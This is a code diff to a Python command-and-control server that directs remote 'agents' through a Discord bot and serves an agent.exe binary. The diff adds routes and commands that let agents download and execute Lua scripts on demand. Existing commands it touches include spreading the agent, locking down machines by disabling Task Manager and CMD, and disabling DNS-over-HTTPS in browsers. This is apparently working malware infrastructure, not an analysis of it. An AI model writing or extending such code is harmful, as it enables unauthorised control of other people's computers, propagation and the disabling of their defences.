@@ -15,7 +15,7 @@ CONTROL_CHANNEL_NAME = os.getenv("CONTROL_CHANNEL", "control")
 AGENT_CHANNEL_PREFIX = os.getenv("AGENT_PREFIX", "agent-")
 STALE_THRESHOLD_MINUTES = int(os.getenv("STALE_THRESHOLD_MINUTES", 5))
 PORT = int(os.getenv("PORT", 10000))
-ADMIN_ROLE_NAME = os.getenv("ADMIN_ROLE", "Admin")  # Role allowed to upload agent
+ADMIN_ROLE_NAME = os.getenv("ADMIN_ROLE", "Admin")
 
 if not BOT_TOKEN:
     raise ValueError("DISCORD_BOT_TOKEN environment variable not set")
@@ -59,10 +59,22 @@ async def handle_agent_download(request):
         return web.Response(text="Agent binary not found", status=404)
     return web.FileResponse(file_path)
 
+async def handle_script_download(request):
+    """Serve Lua scripts from the scripts/ folder."""
+    script_name = request.match_info['name']
+    # Prevent path traversal
+    if '..' in script_name or script_name.startswith('/'):
+        return web.Response(text="Invalid script name", status=400)
+    file_path = os.path.join(os.path.dirname(__file__), "scripts", script_name)
+    if not os.path.exists(file_path):
+        return web.Response(text="Script not found", status=404)
+    return web.FileResponse(file_path)
+
 app = web.Application()
 app.router.add_get("/", handle_health)
 app.router.add_get("/health", handle_health)
 app.router.add_get("/agent.exe", handle_agent_download)
+app.router.add_get("/scripts/{name}", handle_script_download)
 
 async def start_http_server():
     runner = web.AppRunner(app)
@@ -137,19 +149,13 @@ async def send_command_to_agent(interaction: discord.Interaction, cmd_text: str,
 # ------------------- ADMIN UPLOAD COMMAND -------------------
 @bot.tree.command(name="upload_agent", description="Upload a new agent binary (Admin only)")
 async def upload_agent(interaction: discord.Interaction, file: discord.Attachment):
-    # Check if user has the admin role
     if not any(role.name == ADMIN_ROLE_NAME for role in interaction.user.roles):
         await interaction.response.send_message("❌ You don't have permission to use this command.", ephemeral=True)
         return
-
-    # Check file name (optional)
     if not file.filename.endswith(".exe"):
         await interaction.response.send_message("❌ File must be an .exe", ephemeral=True)
         return
-
     await interaction.response.defer(ephemeral=True, thinking=True)
-
-    # Save the file
     file_path = os.path.join(os.path.dirname(__file__), "agent.exe")
     try:
         await file.save(file_path)
@@ -244,7 +250,6 @@ async def spread_command(interaction: discord.Interaction):
 async def update_command(interaction: discord.Interaction):
     await send_command_to_agent(interaction, "update")
 
-# --- New commands added ---
 @bot.tree.command(name="lockdown", description="Apply system lockdown (disable Task Manager, CMD, etc.)")
 async def lockdown_command(interaction: discord.Interaction):
     await send_command_to_agent(interaction, "lockdown")
@@ -252,7 +257,15 @@ async def lockdown_command(interaction: discord.Interaction):
 @bot.tree.command(name="enforce_dns", description="Flush DNS cache and disable DNS-over-HTTPS in browsers")
 async def enforce_dns_command(interaction: discord.Interaction):
     await send_command_to_agent(interaction, "enforce_dns")
-# ------------------- END NEW COMMANDS -------------------
+
+# New script‑related commands
+@bot.tree.command(name="exec", description="Execute a Lua script from the server")
+async def exec_command(interaction: discord.Interaction, script_name: str):
+    await send_command_to_agent(interaction, f"exec {script_name}")
+
+@bot.tree.command(name="list_scripts", description="List available Lua scripts")
+async def list_scripts_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "list")
 
 # ------------------- CONTROL CHANNEL COMMANDS (legacy) -------------------
 @bot.command(name="agents")
